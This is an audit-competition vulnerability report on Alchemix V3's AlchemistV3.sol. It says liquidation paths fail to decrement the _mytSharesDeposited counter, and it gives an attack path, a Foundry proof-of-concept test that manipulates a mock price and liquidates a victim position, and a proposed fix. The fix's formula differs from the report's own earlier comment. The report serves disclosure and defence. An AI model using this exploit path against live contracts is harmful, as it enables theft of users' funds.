# 57559 sc high missing mytsharesdeposited decrement in liquidation paths enables theft of unclaimed yield and protocol insolvency

**Submitted on Oct 27th 2025 at 09:19:23 UTC by @rshackin for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57559
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield

## Description

## Summary :

In AlchemistV3's liquidation mechanism when MYT (Meta Yield Token) is transferred out during liquidation to pay the liquidator fee and send assets to the transmuter, the internal `_mytSharesDeposited` counter, which tracks total deposited MYT collateral and is used to compute protocol TVL, is not decremented. This creates two simultaneous impacts: (1) immediate theft of MYT from victim positions by arbitrary callers who trigger liquidation, and (2) persistent overstatement of protocol TVL that weakens subsequent liquidation enforcement, enabling bad debt accumulation toward insolvency.

## Vulnerability Details :

* Affected Contract: AlchemistV3.sol
* Affected Functions: `_doLiquidation()`, `_liquidate()` (repayment-only branch)
* **Root Cause: Inconsistent accounting between liquidation paths and other MYT outflow paths (repay/burn)** (<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L852-L880>)

When a liquidation occurs, AlchemistV3 executes the following MYT transfers:

1. Sends `amountLiquidated - feeInYield` to the transmuter.
2. Sends `feeInYield` directly to `msg.sender` (the liquidator). However, unlike `repay()` and `burn()` functions which correctly decrement `_mytSharesDeposited` when MYT leaves the contract, the liquidation paths omit this accounting step entirely.

Evidence: Correct implementation in repay() (lines \~455-490):

```solidity
function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
    // ... repayment logic ...
    
    TokenUtils.safeTransfer(myt, protocolFeeReceiver, creditToYield * protocolFee / BPS);
    _mytSharesDeposited -= creditToYield * protocolFee / BPS;   //  correct
    
    // ...
}
```

While in `_doLiquidation`:

```solidity
function _doLiquidation(uint256 accountId, uint256 collateralInUnderlying, uint256 repaidAmountInYield)
    internal
    returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying)
{
    // ... calculations ...
    
    amountLiquidated = convertDebtTokensToYield(liquidationAmount);
    feeInYield = convertDebtTokensToYield(baseFee);

    account.collateralBalance = account.collateralBalance > amountLiquidated 
        ? account.collateralBalance - amountLiquidated : 0;
    _subDebt(accountId, debtToBurn);

    // MYT leaves contract here
    TokenUtils.safeTransfer(myt, transmuter, amountLiquidated - feeInYield);

    // Liquidator receives fee from victim's collateral
    if (feeInYield > 0 && account.collateralBalance >= feeInYield) {
        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
    }
    
    // Missing : _mytSharesDeposited -= (amountLiquidated + feeInYield);
    // This should mirror the accounting in repay() and burn()
}
```

## Impact Details :

Impact 1: Theft of Unclaimed Yield:

* Any external user can call `liquidate()` on an under-collateralized position.
* The caller receives `feeInYield` in MYT directly from the victim's collateral to their wallet.
* **This is a permissionless extraction of yield-bearing assets from the victim's position**.
* The victim loses MYT collateral value equal to the liquidation fee without any compensation.

Impact 2: Protocol Insolvency:

* `_mytSharesDeposited` is used in `_getTotalUnderlyingValue()` to calculate protocol-wide TVL.
* TVL calculations feed into collateralization checks via `calculateLiquidation()`.
* After each liquidation, `_mytSharesDeposited` overstates actual MYT holdings by the amount that left.
* This makes collateralization ratios appear healthier than reality.
* Over repeated exploitations, bad debt accumulates as the TVL/debt ratio diverges from reality.
* System-wide insolvency risk increases as actual collateral < recorded collateral.

**The liquidation mechanism being permissionless is intentional. What is unintentional is the accounting inconsistency:**

* `repay()` decrements `_mytSharesDeposited` for MYT outflows
* `burn()` decrements `_mytSharesDeposited` for MYT outflows
* `withdraw()` decrements `_mytSharesDeposited` for MYT outflows
* **`liquidate()` does NOT decrement `_mytSharesDeposited` for MYT outflows**

## Attack Path:

* Attacker monitors for positions approaching liquidation threshold.
* When a position becomes eligible, attacker calls `liquidate(victimId)`.
* Attacker receives `feeInYield` MYT to their address (immediate profit).
* Protocol's `_mytSharesDeposited` remains unchanged despite MYT leaving.
* Future liquidation checks use inflated TVL, allowing risky positions to persist.
* **Attacker repeats on multiple positions, compounding both theft and accounting drift**.
* Protocol accumulates bad debt as actual collateral falls below liabilities.

## Proof of Concept

## Proof of Concept:

Step 1: Add helper to read private storage slot: In `AlchemistV3.t.sol`, add this constant and helper function near the top of the test contract:

```solidity
// Storage slot 30 contains _mytSharesDeposited (verified via forge inspect)
bytes32 constant MYT_SHARES_SLOT = bytes32(uint256(30));

function _readMYTShares(address alchemist_) internal view returns (uint256) {
    return uint256(vm.load(alchemist_, MYT_SHARES_SLOT));
}
```

Step 2: Add the PoC test:

```solidity
function test_PoC_Liquidation_FeeFarming_TVLDrift_UsesExistingSymbols() external {
    // 1) Seed MYT (vault shares) liquidity
    vm.startPrank(someWhale);
    IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
    vm.stopPrank();

    // 2) Victim: deposit + mint to create position
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), 200 ether);
    alchemist.deposit(200 ether, address(0xbeef), 0);
    uint256 victimId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    alchemist.mint(
        victimId,
        alchemist.totalValue(victimId) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization(),
        address(0xbeef)
    );
    vm.stopPrank();

    // 3) Manipulate price to push victim under collateralization lower bound
    uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
    uint256 modifiedVaultSupply = (initialVaultSupply * 4000 / 10_000) + initialVaultSupply; // +40%
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

    // 4) Capture pre-liquidation state
    vm.startPrank(externalUser);
    uint256 liqMYTBefore = IERC20(address(vault)).balanceOf(externalUser);
    uint256 alcMYTBefore = IERC20(address(vault)).balanceOf(address(alchemist));
    uint256 sharesBefore = _readMYTShares(address(alchemist));

    // 5) Execute liquidation
    (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(victimId);

    // 6) Capture post-liquidation state
    uint256 liqMYTAfter = IERC20(address(vault)).balanceOf(externalUser);
    uint256 alcMYTAfter = IERC20(address(vault)).balanceOf(address(alchemist));
    uint256 sharesAfter = _readMYTShares(address(alchemist));
    vm.stopPrank();

    // 7) Assertions proving the vulnerability
    
    // Proves MYT left the contract (to transmuter + liquidator)
    assertEq(alcMYTBefore - alcMYTAfter, assets + feeInYield);
    
    // Proves internal TVL counter was NOT decremented (accounting bug)
    assertEq(sharesAfter, sharesBefore);

    // Proves liquidator received fee (theft)
    if (feeInYield > 0) {
        assertEq(liqMYTAfter - liqMYTBefore, feeInYield);
    }
}
```

* Recommended Fix: Add in `_doLiquidation()` after MYT transfers:

```solidity
_mytSharesDeposited -= (amountLiquidated + repaidAmountInYield);
```
